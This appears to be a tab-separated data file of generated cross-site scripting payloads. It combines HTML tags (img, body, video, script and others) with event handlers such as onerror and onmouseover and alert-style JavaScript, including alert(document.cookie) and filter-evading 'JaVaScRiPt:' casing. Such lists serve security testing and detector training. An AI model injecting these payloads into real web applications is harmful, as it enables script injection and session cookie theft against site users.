html_open	src	href	event	equal	payload	html_close
<body	NULL	NULL	onerror	=	JaVaScRiPt:alert('XSS')	></body>
<audio	src=1	href=1	onload	=	alert("XSS")	></audio>
<video	NULL	NULL	onclick	=	alert(document.cookie)	></video>
<object	NULL	NULL	onmousemove	=	alert(0)	></object>
<img	src=1	href=1	onmouseover	=	"alert(document.cookie)"	></img>
<body	src=1	href=1	onclick	=	"alert(document.cookie)"	></body>
<img	NULL	NULL	onload	=	alert(0)	></img>
<video	src=1	href=1	onerror	=	alert(0)	></video>
<object	NULL	NULL	onmouseover	=	"javascript:alert('XSS')"	></object>
<body	src=1	href=1	onmousemove	=	alert("XSS")	></body>
<script>	NULL	NULL	onload	=	alert(document.cookie)	</script>
<body	src=1	href=1	onload	=	"javascript:alert('XSS')"	></body>
<audio	NULL	NULL	onmouseover	=	alert(0)	></audio>
<video	src=1	href=1	onmousemove	=	"javascript:alert('XSS')"	></video>
<audio	NULL	NULL	onmousemove	=	"alert(document.cookie)"	></audio>
<object	src=1	href=1	onerror	=	alert(document.cookie)	></object>
<img	src=1	href=1	onmousemove	=	alert(document.cookie)	></img>
<object	NULL	NULL	onclick	=	alert("XSS")	></object>
<script>	NULL	NULL	onerror	=	"javascript:alert('XSS')"	</script>
<video	NULL	NULL	onload	=	"alert(document.cookie)"	></video>
<body	NULL	NULL	onmouseover	=	alert(0)	></body>
<img	src=1	href=1	onclick	=	JaVaScRiPt:alert('XSS')	></img>
<script>	NULL	NULL	onmouseover	=	alert("XSS")	</script>
<video	NULL	NULL	onmouseover	=	JaVaScRiPt:alert('XSS')	></video>
<video	src=1	href=1	onerror	=	alert("XSS")	></video>
<img	src=1	href=1	onclick	=	"javascript:alert('XSS')"	></img>
<object	src=1	href=1	onerror	=	"alert(document.cookie)"	></object>
<script>	NULL	NULL	onmousemove	=	JaVaScRiPt:alert('XSS')	</script>
<img	NULL	NULL	onerror	=	alert("XSS")	></img>
<audio	src=1	href=1	onclick	=	JaVaScRiPt:alert('XSS')	></audio>
<audio	src=1	href=1	onerror	=	alert(document.cookie)	></audio>
<object	src=1	href=1	onload	=	JaVaScRiPt:alert('XSS')	></object>
<script>	NULL	NULL	onclick	=	alert(0)	</script>
<script>	NULL	NULL	onmousemove	=	"alert(document.cookie)"	</script>
<body	src=1	href=1	onmouseover	=	alert(document.cookie)	></body>
<audio	NULL	NULL	onmousemove	=	"javascript:alert('XSS')"	></audio>
